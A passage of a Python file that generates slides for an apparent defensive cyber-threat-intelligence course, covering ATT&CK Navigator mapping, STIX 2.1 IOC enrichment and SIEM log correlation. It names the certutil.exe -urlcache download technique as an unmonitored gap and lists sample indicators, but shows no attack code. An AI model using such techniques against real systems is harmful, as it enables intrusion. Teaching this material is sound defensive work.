                    <strong style="color: var(--alert-crimson); font-size: 13px;">⚠️ Critical Gaps Exposed by Matrix</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Zero detection rules currently monitor <code>certutil.exe -urlcache</code> ingress downloads in perimeter proxies.</li>
                      <li>Scheduled tasks created under standard user privileges do not trigger high-priority alerts in the current SIEM configuration.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "A heatmap is useless if it sits in a drawer. The entire purpose of ATT&CK mapping is identifying where our defensive chokepoints must be established.",
            "notes_pedagogy": "Guide students to realize that stopping Event B (macro child process) prevents Events C, D, and E from ever happening."
        },

        # Slide F: Troubleshooting
        {
            "title": "LAB 03 (Part 6/7): Troubleshooting & Recovery",
            "day": "DAY 02",
            "module": "MOD-02: THREAT MODELING & ATT&CK",
            "session": "LAB-03 [F: TROUBLESHOOTING]",
            "ref": "Handbook Lab Manual 3 — Section 3.7",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-red">LAB-03: STEP 6 OF 7 // ERROR RESOLUTION & RECOVERY</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Common Navigator Errors & Diagnostic Fixes</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Rapid recovery procedures for Navigator rendering and schema validation issues.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div class="cyber-card">
                    <strong style="color: var(--alert-crimson); font-size: 12px;">Issue 1: Navigator Displays 'Invalid Layer Schema' on JSON Upload</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Occurs when version tag mismatches or syntax error is present.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Recovery: Validate JSON schema against standard validator</span>
python -c "import json; json.load(open('operation_solarphish_layer.json'))"
<span class="terminal-cmd"># Verify: Ensure 'versions' block contains 'attack': '15'</span>
                      </div>
                    </div>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 12px;">Issue 2: Color Gradient Not Displaying on Scored Cells</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Navigator color configuration range does not span assigned score range (1 to 5).</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Recovery: In Navigator UI -> Click 'Color Setup' (palette icon)</span>
<span class="terminal-cmd"># Set Low Value = 1 (Yellow), High Value = 5 (Red) -> Click Apply</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "If Navigator rejects your JSON file, run the quick Python validation one-liner shown on screen. It will tell you the exact line number of any syntax error.",
            "notes_pedagogy": "Remind students that JSON does not permit trailing commas after the final list element."
        },

        # Slide G: Assessment
        {
            "title": "LAB 03 (Part 7/7): Completion & Assessment",
            "day": "DAY 02",
            "module": "MOD-02: THREAT MODELING & ATT&CK",
            "session": "LAB-03 [G: ASSESSMENT]",
            "ref": "Handbook Lab Manual 3 — Section 3.6",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-03: STEP 7 OF 7 // VERIFICATION & GRADING</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Deliverable Checklist & Assessment Rubric</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify all deliverables are saved before session wrap-up.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">📋 Completion Checklist</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.8;">
                      <li>[ ] Table mapping Events A–E to exact ATT&CK v15 sub-techniques completed.</li>
                      <li>[ ] Validated JSON layer file <code>operation_solarphish_layer.json</code> saved.</li>
                      <li>[ ] Exported PNG/SVG heatmap showing Yellow/Orange/Red score gradients.</li>
                      <li>[ ] At least two MITRE D3FEND defensive countermeasures articulated.</li>
                    </ul>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">⚖️ Assessment Rubric (100 Points)</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Mapping Precision (Events A–E):</td><td><strong>40 Pts</strong> (Exact v15 sub-techniques identified)</td></tr>
                      <tr><td style="color: #FFF;">Navigator Layer Quality:</td><td><strong>30 Pts</strong> (Valid schema, scores 1–5, color gradient)</td></tr>
                      <tr><td style="color: #FFF;">D3FEND Defensive Articulation:</td><td><strong>30 Pts</strong> (Concrete architectural mitigations)</td></tr>
                      <tr><td style="color: var(--cyber-cyan);">Total Passing Standard:</td><td><strong>75% or higher</strong></td></tr>
                    </table>
                  </div>
                </div>
                
                <div style="text-align: center; margin-top: 16px;">
                  <span class="cyber-badge badge-green" style="font-size: 12px; padding: 6px 18px;">LAB-03 OFFICIAL COMPLETION VERIFIED // PROCEED TO KNOWLEDGE CHECK</span>
                </div>
              </div>
            ''',
            "notes_say": "Save your JSON layer file. Pod leads, review each workstation's heatmap gradient to confirm that all 6 techniques are colored and annotated.",
            "notes_pedagogy": "Ensure students understand how this ATT&CK layer will directly feed tomorrow's STIX bundling exercise."
        }
    ]


def get_lab02_slides():
    """Day 3: LAB 02 — IOC Enrichment & Contextual Threat Scoring with STIX 2.1"""
    return [
        # Slide A: Intro
        {
            "title": "LAB 02 (Part 1/7): Introduction & Objectives",
            "day": "DAY 03",
            "module": "MOD-03: STIX/TAXII & IOC ENRICHMENT",
            "session": "LAB-02 [A: INTRO]",
            "ref": "Handbook Lab Manual 2 — Section 2.1",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-blue">LAB-02: STEP 1 OF 7 // SPECIFICATION & OBJECTIVES</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">IOC Enrichment & Contextual Threat Scoring</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Defanging raw telemetry, algorithmic risk scoring, and OASIS STIX 2.1 bundle construction.</p>
                
                <div class="grid-3" style="margin-top: 18px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">🎯 Core Learning Objectives</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Parse, normalize, and safely defang heterogeneous indicators of compromise.</li>
                      <li>Execute automated risk scoring using multi-factor weighted reputation logic.</li>
                      <li>Construct and validate OASIS STIX 2.1 JSON intelligence bundles in Python.</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⏱️ Parameters & Scope</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Estimated Duration:</strong> 85 Minutes.</li>
                      <li><strong>Instructional Framework:</strong> IBM ICE & OASIS STIX 2.1 Standard.</li>
                      <li><strong>PLO Mapping:</strong> PLO-2 (Dissecting and enriching IoCs using STIX 2.1).</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">📦 Required Deliverables</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Completed <code>enrich_indicators.py</code> Python script.</li>
                      <li>Validated STIX 2.1 JSON bundle: <code>student_bundle_&lt;id&gt;.json</code>.</li>
                      <li>Calculated Threat Scoring Table with Critical/Suspicious/Low tiers.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Welcome to Day 3's practical lab. Today you will bridge the gap between raw, messy indicators and machine-readable threat intelligence using the OASIS STIX 2.1 standard.",
            "notes_pedagogy": "Emphasize that without defanging, automated chat systems or email scanners might accidentally resolve malicious links."
        },

        # Slide B: Setup
        {
            "title": "LAB 02 (Part 2/7): Environment Preparation",
            "day": "DAY 03",
            "module": "MOD-03: STIX/TAXII & IOC ENRICHMENT",
            "session": "LAB-02 [B: SETUP]",
            "ref": "Handbook Lab Manual 2 — Section 2.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-02: STEP 2 OF 7 // WORKSTATION PREPARATION</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Virtual Environment & Python Package Verification</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Activating the dedicated SOC virtual environment and verifying STIX 2.1 libraries.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">💻 Environment Configuration</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Virtual Environment:</td><td><code>C:\\Threat_Intel_IR_2026\\venv_soc\\</code></td></tr>
                      <tr><td style="color: #FFF;">Python Runtime:</td><td>Python 3.12 64-bit</td></tr>
                      <tr><td style="color: #FFF;">Core Libraries:</td><td><code>stix2 (v3.0.1)</code>, <code>requests</code>, <code>pandas</code></td></tr>
                      <tr><td style="color: #FFF;">Dataset:</td><td><code>stix_bundle_apt_example.json</code></td></tr>
                    </table>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⚡ Pre-Flight Verification Commands</strong>
                    <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Run in PowerShell to activate environment and verify stix2:</p>
                    <div class="terminal-buffer" style="margin-top: 8px; font-size: 11px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># 1. Activate dedicated SOC Python virtual environment</span>
& "C:\\Threat_Intel_IR_2026\\venv_soc\\Scripts\\Activate.ps1"
<span class="terminal-cmd"># 2. Test stix2 library availability and version</span>
python -c "import stix2; print('STIX2 Ready: ' + stix2.__version__)"
                      </div>
                    </div>
                    <div style="font-size: 10px; color: var(--emerald-pass); margin-top: 4px;">✓ Expected response: 'STIX2 Ready: 3.0.1'</div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Activate your PowerShell virtual environment. Make sure you see (venv_soc) in your prompt before running any scripts.",
            "notes_pedagogy": "Check that students are running inside venv_soc so package dependencies are isolated from system Python."
        },

        # Slide C: Procedure
        {
            "title": "LAB 02 (Part 3/7): Step-by-Step Procedure",
            "day": "DAY 03",
            "module": "MOD-03: STIX/TAXII & IOC ENRICHMENT",
            "session": "LAB-02 [C: PROCEDURE]",
            "ref": "Handbook Lab Manual 2 — Section 2.4",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-amber">LAB-02: STEP 3 OF 7 // EXECUTION PROTOCOL</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">3-Phase Practical Enrichment Protocol</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Defang raw telemetry, apply weighted scoring, and serialize STIX 2.1 bundles.</p>
                
                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 14px;">
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">PHASE 1: Indicator Parsing & Defanging (Minutes 00–25)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Open <code>enrich_indicators.py</code> in VS Code.</li>
                      <li>Implement string defanging: Replace dots with <code>[.]</code> and protocol prefixes with <code>hxxp://</code>.</li>
                      <li>Parse raw target indicators: IP <code>203.0.113.88</code>, Domain <code>login-portal-auth365.com</code>, and SHA-256 hash.</li>
                    </ol>
                  </div>
                  
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--electric-blue); font-size: 12px;">PHASE 2: Automated Threat Scoring Logic (Minutes 25–55)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Apply the weighted scoring formula: <code>Score = (Age_Weight * 0.3) + (Reputation_Weight * 0.4) + (Sighting_Weight * 0.3)</code>.</li>
                      <li>Classify into actionable risk tiers: Critical (80–100 -> EDR block), Suspicious (50–79 -> sandbox), Low (0–49).</li>
                    </ol>
                  </div>

                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--emerald-pass); font-size: 12px;">PHASE 3: OASIS STIX 2.1 Bundle Construction (Minutes 55–85)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Instantiate STIX 2.1 <code>Indicator</code> using pattern <code>[domain-name:value = 'login-portal-auth365.com']</code>.</li>
                      <li>Instantiate <code>ThreatActor</code> for <code>UNC-PHOENIX</code>.</li>
                      <li>Create SRO <code>Relationship</code> with <code>relationship_type='indicates'</code> and serialize into a <code>Bundle</code>.</li>
                    </ol>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Walk through the Python script. Notice how the stix2 library enforces exact syntax — the pattern expression requires square brackets and single quotes inside double quotes.",
            "notes_pedagogy": "Guide students through the STIX pattern grammar: [domain-name:value = 'x'] is standard OASIS syntax."
        },

        # Slide D: Output
        {
            "title": "LAB 02 (Part 4/7): Expected Output & STIX Schema",
            "day": "DAY 03",
            "module": "MOD-03: STIX/TAXII & IOC ENRICHMENT",
            "session": "LAB-02 [D: OUTPUT]",
            "ref": "Handbook Lab Manual 2 — Section 2.5",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-green">LAB-02: STEP 4 OF 7 // VERIFIED ARTIFACTS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Expected Serialized STIX 2.1 JSON Bundle</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Verify your output against this validated OASIS STIX 2.1 JSON extract.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div>
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">Serialized STIX 2.1 JSON Extract:</strong>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px; max-height: 240px; overflow-y: auto;">
                      <div class="terminal-body">
{
  "type": "bundle",
  "id": "bundle--3d92b0fa-9811-477d-b2a1-fae120893b11",
  "objects": [
    {
      "type": "indicator",
      "spec_version": "2.1",
      "id": "indicator--8e2e2d2b-17d4-4cbf-938f-98ee46b3cd3f",
      "created": "2026-10-28T09:15:00.000Z",
      "name": "UNC-PHOENIX C2 Beacon Domain",
      "pattern": "[domain-name:value = 'login-portal-auth365.com']",
      "pattern_type": "stix",
      "valid_from": "2026-10-26T00:00:00Z"
    },
    {
      "type": "threat-actor",
      "spec_version": "2.1",
      "id": "threat-actor--b210a4df-6d73-41bb-927b-23a9d9401823",
      "name": "UNC-PHOENIX",
      "threat_actor_types": ["cybercrime", "espionage"]
    },
    {
      "type": "relationship",
      "spec_version": "2.1",
      "id": "relationship--c501e4a1-7b92-48cd-b12a-394017f8a123",
      "relationship_type": "indicates",
      "source_ref": "indicator--8e2e2d2b-17d4-4cbf-938f-98ee46b3cd3f",
      "target_ref": "threat-actor--b210a4df-6d73-41bb-927b-23a9d9401823"
    }
  ]
}
                      </div>
                    </div>
                  </div>

                  <div>
                    <strong style="color: var(--emerald-pass); font-size: 12px;">What to Inspect & Verify:</strong>
                    <div class="cyber-card" style="margin-top: 6px; font-size: 11px; line-height: 1.6;">
                      <ul style="color: var(--text-secondary); padding-left: 16px;">
                        <li><strong>Canonical UUIDv4:</strong> Every STIX object ID must begin with its type prefix followed by a valid UUID (e.g. <code>indicator--&lt;uuid&gt;</code>).</li>
                        <li><strong>Referential Integrity:</strong> In the relationship object, <code>source_ref</code> must exactly equal the indicator ID, and <code>target_ref</code> must equal the threat-actor ID.</li>
                        <li><strong>Threat Score Output:</strong> Domain score must compute to <strong>86/100 (Critical)</strong>.</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Look at the relationship object: source_ref points to the indicator, target_ref points to the actor. That is how STIX constructs a graph of intelligence rather than isolated flat records.",
            "notes_pedagogy": "Ask the class: 'What happens if a SIEM receives an indicator without an expiration date?' Explain IOC rot."
        },

        # Slide E: Interpretation
        {
            "title": "LAB 02 (Part 5/7): Technical Interpretation",
            "day": "DAY 03",
            "module": "MOD-03: STIX/TAXII & IOC ENRICHMENT",
            "session": "LAB-02 [E: INTERPRETATION]",
            "ref": "Handbook Lab Manual 2 — Section 2.5.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-02: STEP 5 OF 7 // ANALYTICAL SYNTHESIS</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Intelligence Operationalization & Scoring Rationale</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">How weighted scoring drives automated SIEM/EDR containment workflows.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">🎯 Operational Decision Matrix</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: var(--alert-crimson);">Score 80–100:</td><td><strong>Automated Block:</strong> Immediate boundary firewall DNS sinkhole & EDR network isolation.</td></tr>
                      <tr><td style="color: var(--neon-amber);">Score 50–79:</td><td><strong>Suspicious Monitoring:</strong> High-priority sandbox execution & proxy logging alert.</td></tr>
                      <tr><td style="color: var(--emerald-pass);">Score 0–49:</td><td><strong>Baseline Log:</strong> Standard audit retention, no active blocking.</td></tr>
                    </table>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">💡 Why STIX 2.1 Over CSV Feeds?</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>CSVs contain bare strings without confidence, expiration, or context.</li>
                      <li>STIX 2.1 bundles capture the complete relationship graph: Which malware family uses this IP? Which campaign operates this C2?</li>
                      <li>Enables TAXII 2.1 automated machine-to-machine exchange across trusted defense communities.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "When an analyst manually blocks 500 IPs from a CSV, they are doing janitorial work. When your TAXII server ingests STIX bundles and feeds your firewall based on dynamic score tiers, you have achieved modern CTI engineering.",
            "notes_pedagogy": "Reinforce that threat scoring solves alert fatigue by filtering out low-confidence noise."
        },

        # Slide F: Troubleshooting
        {
            "title": "LAB 02 (Part 6/7): Troubleshooting & Recovery",
            "day": "DAY 03",
            "module": "MOD-03: STIX/TAXII & IOC ENRICHMENT",
            "session": "LAB-02 [F: TROUBLESHOOTING]",
            "ref": "Handbook Lab Manual 2 — Section 2.7",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-red">LAB-02: STEP 6 OF 7 // ERROR RESOLUTION & RECOVERY</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Common STIX Python Errors & Diagnostics</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Resolving pattern syntax exceptions and serialization bugs.</p>
                
                <div class="grid-2" style="margin-top: 14px;">
                  <div class="cyber-card">
                    <strong style="color: var(--alert-crimson); font-size: 12px;">Issue 1: stix2.exceptions.InvalidValueError in Pattern</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Occurs if STIX pattern quotes are malformed or missing brackets.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># INCORRECT: pattern="domain-name:value = 'x'"</span>
<span class="terminal-cmd"># CORRECT SYNTAX:</span>
pattern="[domain-name:value = 'login-portal-auth365.com']"
                      </div>
                    </div>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 12px;">Issue 2: ModuleNotFoundError: No module named 'stix2'</strong>
                    <p style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">Script was run using global Python interpreter instead of venv_soc.</p>
                    <div class="terminal-buffer" style="margin-top: 6px; font-size: 10px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># Recovery: Explicitly invoke python inside the venv path</span>
& "C:\\Threat_Intel_IR_2026\\venv_soc\\Scripts\\python.exe" enrich_indicators.py
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "If you get an InvalidValueError, check your quotation marks inside the pattern string. STIX patterns require square brackets around the object path.",
            "notes_pedagogy": "Guide students to inspect the exact exception stack trace to locate the failing line in their Python script."
        },

        # Slide G: Assessment
        {
            "title": "LAB 02 (Part 7/7): Completion & Assessment",
            "day": "DAY 03",
            "module": "MOD-03: STIX/TAXII & IOC ENRICHMENT",
            "session": "LAB-02 [G: ASSESSMENT]",
            "ref": "Handbook Lab Manual 2 — Section 2.6",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-02: STEP 7 OF 7 // VERIFICATION & GRADING</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Deliverable Checklist & Assessment Rubric</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Ensure all script outputs and serialized JSON bundles are saved.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">📋 Completion Checklist</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.8;">
                      <li>[ ] Defanging function correctly defangs IP, domain, and URL strings.</li>
                      <li>[ ] Weighted scoring formula generates numerical threat scores for all 3 indicators.</li>
                      <li>[ ] Validated STIX 2.1 JSON file <code>student_bundle_&lt;id&gt;.json</code> saved in lab root.</li>
                      <li>[ ] Zero schema validation errors reported by <code>stix2.validator</code>.</li>
                    </ul>
                  </div>

                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">⚖️ Assessment Rubric (100 Points)</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Defanging & String Normalization:</td><td><strong>30 Pts</strong> (Clean regex implementation)</td></tr>
                      <tr><td style="color: #FFF;">STIX 2.1 Schema Validity:</td><td><strong>40 Pts</strong> (Valid Bundle, SDOs, SROs & UUIDs)</td></tr>
                      <tr><td style="color: #FFF;">Threat Scoring Rationale:</td><td><strong>30 Pts</strong> (Correct multi-factor calculation)</td></tr>
                      <tr><td style="color: var(--cyber-cyan);">Total Passing Standard:</td><td><strong>75% or higher</strong></td></tr>
                    </table>
                  </div>
                </div>
                
                <div style="text-align: center; margin-top: 16px;">
                  <span class="cyber-badge badge-green" style="font-size: 12px; padding: 6px 18px;">LAB-02 OFFICIAL COMPLETION VERIFIED // PROCEED TO KNOWLEDGE CHECK</span>
                </div>
              </div>
            ''',
            "notes_say": "Ensure your STIX JSON bundle is serialized with pretty-printing enabled. Pod leads, please verify that student scripts run with zero syntax errors.",
            "notes_pedagogy": "Check that the relationship ID correctly links the two SDOs together."
        }
    ]


def get_lab04_slides():
    """Day 4: LAB 04 — Security Telemetry Analysis & SIEM Indicator Correlation"""
    return [
        # Slide A: Intro
        {
            "title": "LAB 04 (Part 1/7): Introduction & Objectives",
            "day": "DAY 04",
            "module": "MOD-04: ENTERPRISE TELEMETRY & SIGMA",
            "session": "LAB-04 [A: INTRO]",
            "ref": "Handbook Lab Manual 4 — Section 4.1",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-blue">LAB-04: STEP 1 OF 7 // SPECIFICATION & OBJECTIVES</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Security Telemetry Analysis & SIEM Correlation</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Cross-source triage of Windows Security Events (4624, 4625, 4688) and Suricata IDS alerts.</p>
                
                <div class="grid-3" style="margin-top: 18px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">🎯 Core Learning Objectives</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Ingest and filter Windows authentication events (EID 4624, 4625) and process launches (EID 4688).</li>
                      <li>Detect brute-force clusters and decode base64-obfuscated PowerShell payloads.</li>
                      <li>Correlate endpoint timestamps with Suricata network IDS alerts to identify C2 beaconing.</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⏱️ Parameters & Scope</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li><strong>Estimated Duration:</strong> 85 Minutes.</li>
                      <li><strong>Instructional Framework:</strong> IBM ICE & The Telemetry Triad.</li>
                      <li><strong>PLO Mapping:</strong> PLO-4 (Multi-source telemetry correlation).</li>
                    </ul>
                  </div>
                  <div class="cyber-card">
                    <strong style="color: var(--emerald-pass); font-size: 13px;">📦 Required Deliverables</strong>
                    <ul style="font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <li>Compromised account triage report identifying <code>svc_backup_admin</code>.</li>
                      <li>Decoded CyberChef PowerShell payload and second-stage C2 URL.</li>
                      <li>Cross-source correlated forensic timeline table.</li>
                    </ul>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Today we dive into real operational telemetry. You have 2,500 authentication events and 1,200 network alerts. You will find patient zero by pivoting from failed logons to process execution and outbound network telemetry.",
            "notes_pedagogy": "Remind students that attackers live between the logs — an authentication failure looks benign until linked to a process launch."
        },

        # Slide B: Setup
        {
            "title": "LAB 04 (Part 2/7): Environment Preparation",
            "day": "DAY 04",
            "module": "MOD-04: ENTERPRISE TELEMETRY & SIGMA",
            "session": "LAB-04 [B: SETUP]",
            "ref": "Handbook Lab Manual 4 — Section 4.2",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-cyan">LAB-04: STEP 2 OF 7 // WORKSTATION PREPARATION</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">Dataset Ingestion & Analysis Toolchain</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Preparing Python pandas environment and verifying JSON log datasets.</p>
                
                <div class="grid-2" style="margin-top: 16px;">
                  <div class="cyber-card">
                    <strong style="color: var(--cyber-cyan); font-size: 13px;">💻 Toolchain & Datasets</strong>
                    <table style="width: 100%; font-size: 11px; color: var(--text-secondary); margin-top: 8px; line-height: 1.6;">
                      <tr><td style="color: #FFF;">Environment:</td><td>Python 3.12 (<code>pandas</code>, <code>json</code>)</td></tr>
                      <tr><td style="color: #FFF;">Interface:</td><td>VS Code / JupyterLab + CyberChef (Offline)</td></tr>
                      <tr><td style="color: #FFF;">Auth Logs:</td><td><code>auth_events.json</code> (2,500 synthetic events)</td></tr>
                      <tr><td style="color: #FFF;">Network Logs:</td><td><code>network_alerts.json</code> (1,200 Suricata records)</td></tr>
                    </table>
                  </div>
                  
                  <div class="cyber-card">
                    <strong style="color: var(--neon-amber); font-size: 13px;">⚡ Pre-Flight Verification Commands</strong>
                    <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Verify dataset sizes and line counts in PowerShell:</p>
                    <div class="terminal-buffer" style="margin-top: 8px; font-size: 11px;">
                      <div class="terminal-body">
<span class="terminal-cmd"># 1. Confirm dataset file sizes and records</span>
Get-Item "C:\\Threat_Intel_IR_2026\\06_Datasets_and_Examples\\auth_events.json" | Select-Object Length
Get-Item "C:\\Threat_Intel_IR_2026\\06_Datasets_and_Examples\\network_alerts.json" | Select-Object Length
<span class="terminal-cmd"># 2. Test pandas import in active environment</span>
python -c "import pandas as pd; print('Pandas Ready: ' + pd.__version__)"
                      </div>
                    </div>
                    <div style="font-size: 10px; color: var(--emerald-pass); margin-top: 4px;">✓ Expected response: Valid file sizes and Pandas version printed</div>
                  </div>
                </div>
              </div>
            ''',
            "notes_say": "Check your file paths before launching your notebook. If your system has limited RAM, use the chunksize parameter when reading the JSON files.",
            "notes_pedagogy": "Ensure all students have opened their Python interactive session or JupyterLab before starting Phase 1."
        },

        # Slide C: Procedure
        {
            "title": "LAB 04 (Part 3/7): Step-by-Step Procedure",
            "day": "DAY 04",
            "module": "MOD-04: ENTERPRISE TELEMETRY & SIGMA",
            "session": "LAB-04 [C: PROCEDURE]",
            "ref": "Handbook Lab Manual 4 — Section 4.4",
            "content": '''
              <div style="text-align: left;">
                <div class="cyber-badge badge-amber">LAB-04: STEP 3 OF 7 // EXECUTION PROTOCOL</div>
                <h2 style="font-size: 1.8rem; margin: 8px 0 4px 0;">3-Phase Practical Correlation Workflow</h2>
                <p style="color: var(--text-secondary); font-size: 0.95rem;">Execute authentication triage, command-line de-obfuscation, and network correlation.</p>
                
                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 14px;">
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--cyber-cyan); font-size: 12px;">PHASE 1: Authentication Log Triage (Minutes 00–30)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
                      <li>Ingest <code>auth_events.json</code> into a pandas DataFrame. Filter for Event ID <code>4625</code> (Failed Logon).</li>
                      <li>Run <code>value_counts()</code> on <code>TargetUserName</code> to identify targeted account: <code>svc_backup_admin</code> (42 failures).</li>
                      <li>Filter for Event ID <code>4624</code> (Logon Type 10 - Remote Desktop) immediately following the cluster. Record compromised timestamp.</li>
                    </ol>
                  </div>
                  
                  <div class="cyber-card" style="padding: 12px 16px;">
                    <strong style="color: var(--electric-blue); font-size: 12px;">PHASE 2: Process Creation & De-obfuscation (Minutes 30–60)</strong>
                    <ol style="font-size: 11px; color: var(--text-secondary); margin-left: 18px; margin-top: 4px; line-height: 1.5;">
